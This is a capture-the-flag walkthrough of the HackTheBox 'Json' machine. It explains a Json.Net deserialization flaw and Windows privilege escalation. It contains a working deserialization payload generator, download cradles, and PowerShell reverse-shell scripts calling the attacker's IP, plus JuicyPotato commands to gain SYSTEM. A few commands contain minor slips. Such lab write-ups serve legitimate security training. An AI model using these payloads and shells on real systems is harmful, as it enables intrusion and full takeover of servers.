# HackTheBox: Json — Comprehensive Walkthrough

**Target IP:** `10.129.227.191`  
**Attacker IP:** `10.10.16.84`  
**OS:** Windows Server 2012 R2  
**Difficulty:** Medium  
**Flags:**
- User: `54bdd2[redacted]4178ace78`
- Root: `0e49fd[redacted]8b8459f70c`

---

## Table of Contents
1. [Introduction & Mindset](#introduction--mindset)
2. [Step 1: Reconnaissance — Mapping the Terrain](#step-1-reconnaissance--mapping-the-terrain)
3. [Step 2: Web Application Enumeration](#step-2-web-application-enumeration)
4. [Step 3: API Analysis & Authentication Flow](#step-3-api-analysis--authentication-flow)
5. [Step 4: Vulnerability Discovery — Finding the Cracks](#step-4-vulnerability-discovery--finding-the-cracks)
6. [Step 5: Understanding .NET Deserialization](#step-5-understanding-net-deserialization)
7. [Step 6: Generating the Exploit Payload](#step-6-generating-the-exploit-payload)
8. [Step 7: Initial Access — Shell as userpool](#step-7-initial-access--shell-as-userpool)
9. [Step 8: Post-Exploitation Enumeration](#step-8-post-exploitation-enumeration)
10. [Step 9: Privilege Escalation Theory](#step-9-privilege-escalation-theory)
11. [Step 10: SYSTEM via JuicyPotato](#step-10-system-via-juicypotato)
12. [Alternative Root Paths (For Your Notes)](#alternative-root-paths-for-your-notes)
13. [Lessons Learned](#lessons-learned)

---

## Introduction & Mindset

Before we touch the target, let's talk about **hacker mindset**.

When you approach any box, you are not "hacking" — you are **studying**. You are observing how a system was built, understanding the developer's assumptions, and finding places where those assumptions break. Every application trusts something: user input, serialized data, configuration files, tokens. Our job is to find what the target trusts *too much*.

**The Json box teaches three critical lessons:**
1. **Never trust serialized data from the user.** If an application deserializes attacker-controlled input, it is often game-over.
2. **Error messages are gold.** A single verbose error can reveal the entire technology stack and vulnerability class.
3. **Privileges matter.** Even a "lowly" service account with `SeImpersonatePrivilege` is one exploit away from SYSTEM.

---

## Step 1: Reconnaissance — Mapping the Terrain

### The Command
```bash
nmap -sC -sV -p- --min-rate 10000 10.129.227.191 -oN nmap_json
```

### Breaking It Down (Baby Steps)
- `-sC`: Run default NSE scripts. These give us extra info like FTP banners, SMB versions, and HTTP titles without extra work.
- `-sV`: Version detection. Knowing *what* software runs on a port is more valuable than knowing *that* a port is open.
- `-p-`: Scan all 65535 TCP ports. Many beginners only scan top 1000 and miss custom services or high-port admin interfaces.
- `--min-rate 10000`: Speed. HTB boxes can handle aggressive scanning; in a real pentest, you'd be more polite.
- `-oN nmap_json`: Save output. **Always log your work.** You will need to reference ports later.

### What We Found
```
21/tcp    open  ftp          FileZilla ftpd 0.9.60 beta
80/tcp    open  http         Microsoft IIS httpd 8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0
49152-49158/tcp open msrpc    Microsoft Windows RPC
```

### Hacker Mindset
> **"What do these ports tell me about the administrator's thinking?"**

- **Port 80 (IIS 8.5)** tells us this is likely Windows Server 2012 R2. IIS 8.5 ships with that OS.
- **Port 21 (FileZilla)** is unusual for a web box. It suggests file transfers are part of the application's design — maybe a sync feature, maybe admin access.
- **Port 5985 (WinRM)** means we *could* potentially get a proper PowerShell remoting shell later if we find credentials.
- **SMB (445)** might allow anonymous access or have shares with interesting files.

**Decision tree:** Start with HTTP (lowest hanging fruit, largest attack surface), keep FTP in mind, and note WinRM for later credential-based access.

---

## Step 2: Web Application Enumeration

### The Action
Navigate to `http://10.129.227.191` in a browser (or use curl).

### What We See
A login page titled "SB Admin 2" that immediately redirects us to `/login.html`. Before we even test SQL injection or XSS, we try the simplest possible credentials:

```bash
curl -i -X POST -H "Content-Type: application/json" -d '{"UserName":"admin","Password":"admin"}' http://10.129.227.191/api/token
```

### Why Try `admin/admin` First?
Because **default credentials are still one of the most common vulnerabilities in the world.** Developers leave them in place during testing. Administrators forget to change them. Our job is to test the obvious before spending hours on complex attacks.

### Hacker Mindset
> **"Every system has a weakest link. Often, it's the human who configured it."**

If `admin/admin` fails, our next steps would be:
1. Check for a "Forgot Password" feature
2. Look at the JavaScript for hardcoded credentials or API endpoints
3. Test for SQL injection on the login form
4. Run a directory brute-force (gobuster, feroxbuster)

But `admin/admin` works. The server responds with:
```
Set-Cookie: OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
```

---

## Step 3: API Analysis & Authentication Flow

### Decoding the Cookie
```bash
echo "eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=" | base64 -d
```

**Result:**
```json
{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
```

### What We Learn
1. The cookie is **base64-encoded JSON** — not encrypted, not signed with HMAC (or at least, we can read it).
2. The password is `21232f297a57a5a743894a0e4a801fc3`, which is the **MD5 hash of "admin"**.
3. The application uses a custom OAuth2 implementation (not real OAuth2 — just a cookie named OAuth2).

### The API Request
After login, the browser makes a GET request to `/api/Account/` with:
- The `OAuth2` cookie
- A `Bearer:` header containing the *same* base64 value

```http
GET /api/Account/ HTTP/1.1
Host: json.htb
Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
Cookie: OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
```

### Hacker Mindset
> **"If the server is reading and interpreting data I control, I want to know *how* it interprets it."**

The server is taking our base64 string, decoding it, and doing *something* with the result. If that "something" is deserialization, we might be able to execute code.

---

## Step 4: Vulnerability Discovery — Finding the Cracks

### Fuzzing the Bearer Header
We send malformed data to see how the server reacts:

```bash
curl -i -X GET -H "Bearer: bad" -H "Cookie: OAuth2=..." http://10.129.227.191/api/Account/
```

**Response:**
```json
{"Message":"An error has occurred.","ExceptionMessage":"Invalid format base64","ExceptionType":"System.Exception","StackTrace":null}
```

**Analysis:** The server tried to base64-decode our input and failed. This tells us the processing pipeline is:
1. Read Bearer header
2. Base64-decode
3. Do something with the result

Next, we send **valid base64 but invalid content**:
```bash
curl -i -X GET -H "Bearer: dGVzdGluZw==" -H "Cookie: OAuth2=..." http://10.129.227.191/api/Account/
```

**Response:**
```json
{"Message":"An error has occurred.","ExceptionMessage":"Cannot deserialize Json.Net Object","ExceptionType":"System.Exception","StackTrace":null}
```

### Why This Error is the Jackpot
**"Cannot deserialize Json.Net Object"** tells us three critical things:
1. The server is using **Json.Net** (Newtonsoft.Json), the most popular .NET JSON library.
2. The server is **deserializing** our input into a .NET object.
3. Because we control the input, we control what gets deserialized.

### Hacker Mindset
> **"Any time a server deserializes user-controlled input, alarm bells should ring."**

Deserialization is the process of turning data (JSON, XML, binary) back into an object in memory. If the attacker controls this data, they can often craft it to instantiate *arbitrary* classes, leading to Remote Code Execution (RCE). This is one of the most dangerous vulnerability classes in modern web applications.

---

## Step 5: Understanding .NET Deserialization

### What is Deserialization?
When a program receives JSON like `{"Name":"Admin"}`, it uses a deserializer to create an object in memory:
```csharp
User user = JsonConvert.DeserializeObject<User>(json);
```

### The Danger: Type Handling
Json.Net supports a feature called **Type Name Handling**. If enabled, the JSON can specify *which .NET class to instantiate*:
```json
{"$type":"System.Diagnostics.Process, System"}
```

If the application deserializes this without proper restrictions, it will create a `Process` object. And certain classes, when instantiated or when their properties are set, execute code as a side effect.

### Gadget Chains
A **gadget chain** is a sequence of innocent-looking .NET classes that, when instantiated in a specific order, lead to arbitrary code execution. We don't exploit a vulnerability in .NET itself — we abuse legitimate functionality.

**Example chain:**
1. `ObjectDataProvider` — a WPF class that calls a method when its `MethodName` property is set.
2. `Process` — when `Start()` is called, it launches a new process.
3. Combine them: `ObjectDataProvider.MethodName = "Start"`, `ObjectDataProvider.ObjectInstance = new Process()`, and `MethodParameters = ["cmd", "/c whoami"]`.

### ysoserial.net
Manually constructing gadget chains is complex. **ysoserial.net** is a tool (like its Java cousin ysoserial) that automates this. It supports many gadgets and formatters:
- **Gadgets:** WindowsIdentity, ObjectDataProvider, ClaimsIdentity, etc.
- **Formatters:** BinaryFormatter, Json.Net, SoapFormatter, etc.

### Hacker Mindset
> **"I don't need to understand every byte of the exploit on day one. I need to understand the *class* of vulnerability, find the right tool, and verify it works. Depth comes with repetition."**

---

## Step 6: Generating the Exploit Payload

### The Challenge
We tried to run ysoserial.net on Kali with `mono`, but the `WindowsIdentity` gadget failed because our Linux host lacks Windows-specific assemblies (`PresentationCore`).

**This is a key lesson:** ysoserial.net *generates* payloads. The generation itself sometimes requires the same assemblies that exist on the *target*. Our Kali machine is not Windows, so some gadgets won't generate.

### The Solution: Manual Payload Construction
Since `ObjectDataProvider` is just JSON, we can construct it manually with Python. The target is Windows and has `PresentationFramework` in the GAC — it will deserialize our payload just fine.

### The Payload Generator
```python
import json
import base64

payload = {
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": ["cmd","/c powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.84:8080/rev.ps1')"]
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
    }
}

json_payload = json.dumps(payload, separators=(',', ':'))
b64_payload = base64.b64encode(json_payload.encode()).decode()
print(b64_payload)
```

### Why This Works
1. `$type` tells Json.Net to instantiate `ObjectDataProvider`.
2. `MethodName = "Start"` tells it to call the `Start()` method.
3. `ObjectInstance` is a `Process` object.
4. `MethodParameters` passes `["cmd", "/c powershell ..."]` to `Process.Start()`.
5. `Process.Start("cmd", "/c powershell ...")` executes our command.

### The Infrastructure
Before sending, we prepare:
```bash
# Reverse shell script (PowerShell)
cat > rev.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.84',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
EOF

# HTTP server to serve rev.ps1
python3 -m http.server 8080 &

# Netcat listener
cnc -lnvp 4444
```

### Hacker Mindset
> **"Exploitation is 20% payload and 80% infrastructure."**
>
> Your payload is useless if there's nothing to catch the shell. Before you fire, always ask: "Where will the callback go? Do I have a listener? Can the target reach me?"

---

## Step 7: Initial Access — Shell as userpool

### Firing the Exploit
```bash
PAYLOAD=$(python3 gen_payload.py)
curl -i -X GET -H "Bearer: $PAYLOAD" -H "Cookie: OAuth2=..." http://10.129.227.191/api/Account/
```

**In the netcat window:**
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.227.191] 49346
PS C:\windows\system32\inetsrv> whoami
json\userpool
```

### Why We Got userpool (Not SYSTEM or admin)
The web application runs under an IIS application pool identity called `userpool`. This is a deliberately low-privilege account. Microsoft designed app pool identities so that even if a web app is compromised, the attacker doesn't immediately own the server.

### What This Means
We have code execution, but we need to escalate. The journey from `userpool` to `SYSTEM` is where the real challenge begins.

---

## Step 8: Post-Exploitation Enumeration

### Immediate Checks
```powershell
whoami /priv
```

**Output:**
```
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

### Why `SeImpersonatePrivilege` Matters
This privilege allows a process to impersonate another user's security context after authenticating them. In web server contexts, this is normal — IIS needs to impersonate users to access resources.

**But:** On Windows, certain COM/DCOM interactions allow you to impersonate the `NT AUTHORITY\SYSTEM` account. Tools like **JuicyPotato**, **RoguePotato**, and **SweetPotato** abuse this by triggering a privileged COM service to authenticate back to a rogue listener under our control. We then use the impersonation token to spawn a new process as SYSTEM.

### Additional Enumeration
```powershell
systeminfo
netstat -ano
tasklist
```

From `netstat`, we notice `127.0.0.1:14147` listening — the FileZilla Server admin interface. This is our alternate root path if JuicyPotato fails.

---

## Step 9: Privilege Escalation Theory

### JuicyPotato Explained
JuicyPotato exploits the following Windows behavior:

1. **COM/DCOM** is Microsoft's component object model. Many Windows services expose COM interfaces.
2. Some COM objects, when instantiated, perform **NTLM authentication** to localhost.
3. The `NTLM` authentication happens over a local RPC connection.
4. JuicyPotato creates a rogue COM server on a port we control.
5. It forces a privileged COM object (running as SYSTEM) to connect to our rogue server.
6. During this connection, Windows performs the NTLM handshake.
7. Because we have `SeImpersonatePrivilege`, we can **steal the SYSTEM token** from this connection.
8. We then use `CreateProcessWithTokenW` to spawn a new process (our reverse shell) with that SYSTEM token.

### CLSIDs
A **CLSID** is a globally unique identifier for a COM class. Different Windows versions have different CLSIDs that work. For **Windows Server 2012 R2**, the working CLSID is:
```
{e60687f7-01a1-40aa-86ac-db1cbf673334}
```

JuicyPotato includes a list of tested CLSIDs per OS version. If one doesn't work, you try another.

### Hacker Mindset
> **"Privileges are not binary. 'Low privilege' is relative. A user with SeImpersonate on an older Windows box is practically SYSTEM already — you just need the right tool."**

---

## Step 10: SYSTEM via JuicyPotato

### Preparation on Kali
We need three things on the target:
1. `JuicyPotato.exe`
2. A batch file that triggers our reverse shell
3. A netcat listener waiting on a new port

```bash
# Download JuicyPotato
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

# Create rev2.bat (short download cradle)
echo 'powershell -c "IEX(New-Object Net.WebClient).downloadString('"'"'http://10.10.16.84:8080/rev2.ps1'"'"')"' > rev2.bat

# Create rev2.ps1 (connects to port 5555)
cat > rev2.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.84',5555)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
EOF

# Start listener on 5555 in a NEW terminal
nc -lnvp 5555
```

### Transfer to Target
In the `userpool` shell (port 4444):
```powershell
IEX(New-Object Net.WebClient).downloadFile('http://10.10.16.84:8080/JuicyPotato.exe', 'C:\Windows\Temp\jp.exe')
IEX(New-Object Net.WebClient).downloadFile('http://10.10.16.84:8080/rev2.bat', 'C:\Windows\Temp\rev2.bat')
```

### Execution
```powershell
C:\Windows\Temp\jp.exe -t * -p C:\Windows\Temp\rev2.bat -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

**Flags explained:**
- `-t *`: Try all available tokens.
- `-p C:\Windows\Temp\rev2.bat`: The program to run as SYSTEM.
- `-l 1337`: The local port for the rogue COM server.
- `-c {CLSID}`: The COM class to instantiate.

### Success Output
```
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 1337
....
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

### In the 5555 Terminal
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.227.191] 49402
PS C:\Windows\system32> whoami
nt authority\system
```

### Grab the Flag
```powershell
type C:\Users\superadmin\Desktop\root.txt
```

**Result:** `0e49fd5[redacted]b8459f70c`

---

## Alternative Root Paths (For Your Notes)

This box has **three known privilege escalation paths** from `userpool` to root access:

### Path A: FileZilla Admin Interface
1. `netstat -ano` reveals `127.0.0.1:14147` (FileZilla Server admin port).
2. Tunnel it to your machine with **Chisel** or SSH port forwarding.
3. Connect with the FileZilla Server interface.
4. The config file at `C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml` shows a user `superadmin`.
5. Change the password, connect via FTP on port 21, and access `C:\Users\superadmin\Desktop\root.txt`.

### Path B: Sync2Ftp Custom Application
1. In `C:\Program Files\Sync2Ftp\`, find `SyncLocation.exe` and `SyncLocation.exe.config`.
2. The config contains encrypted credentials:
   ```xml
   <add key="user" value="4as8gqENn26uTs9srvQLyg=="/>
   <add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="/>
   <add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/>
   ```
3. Reverse-engineer the binary (dnSpy) to find it uses **Triple DES (ECB mode)** with an MD5-hashed key.
4. Decrypt the credentials: `superadmin` / `funnyhtb`.
5. Log in via FTP as `superadmin` and read the flag.

### Path C: JuicyPotato (What We Used)
Fastest and most direct. Abuse `SeImpersonatePrivilege` to get a SYSTEM shell.

---

## Lessons Learned

### Technical
1. **Json.Net deserialization** with `TypeNameHandling` enabled is critical RCE territory. Always check for `$type` fields in JSON APIs.
2. **Verbose errors** (`Cannot deserialize Json.Net Object`) can reveal the exact library and vulnerability class.
3. **SeImpersonatePrivilege** on Windows < Server 2019 is often exploitable via Potato-family tools.
4. **Manual payload construction** is possible when tools fail — understanding the underlying JSON structure is powerful.

### Methodological
1. **Start simple.** `admin/admin` worked. Don't overcomplicate before trying the obvious.
2. **Read errors carefully.** They are often more valuable than successful responses.
3. **Infrastructure first.** Before firing an exploit, ensure your listener, HTTP server, and routing are ready.
4. **Keep notes.** Every port, every error, every file path is a piece of the puzzle.

### Mindset
> **"The difference between a script kiddie and a hacker is that when the tool fails, the hacker knows why and can build the payload by hand."**

We couldn't use ysoserial.net's `WindowsIdentity` gadget because our Linux host lacked Windows assemblies. Instead of giving up, we manually constructed the `ObjectDataProvider` JSON payload. The tool was a convenience, not a requirement. **Understand the vulnerability, not just the tool.**

---

## Quick Reference: All Commands

```bash
# Recon
nmap -sC -sV -p- --min-rate 10000 10.129.227.191 -oN nmap_json

# Login
curl -i -X POST -H "Content-Type: application/json" -d '{"UserName":"admin","Password":"admin"}' http://10.129.227.191/api/token

# Verify deserialization
curl -i -X GET -H "Bearer: dGVzdGluZw==" -H "Cookie: OAuth2=..." http://10.129.227.191/api/Account/

# Generate payload
python3 gen_payload.py

# Send payload
PAYLOAD=$(python3 gen_payload.py)
curl -i -X GET -H "Bearer: $PAYLOAD" -H "Cookie: OAuth2=..." http://10.129.227.191/api/Account/

# Start listeners
python3 -m http.server 8080 &
nc -lnvp 4444
nc -lnvp 5555

# Privesc
IEX(New-Object Net.WebClient).downloadFile('http://10.10.16.84:8080/JuicyPotato.exe', 'C:\Windows\Temp\jp.exe')
C:\Windows\Temp\jp.exe -t * -p C:\Windows\Temp\rev2.bat -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"

# Flags
type C:\Users\userpool\Desktop\user.txt
type C:\Users\superadmin\Desktop\root.txt
```

---

*Happy hacking. Understand the why, not just the how.*
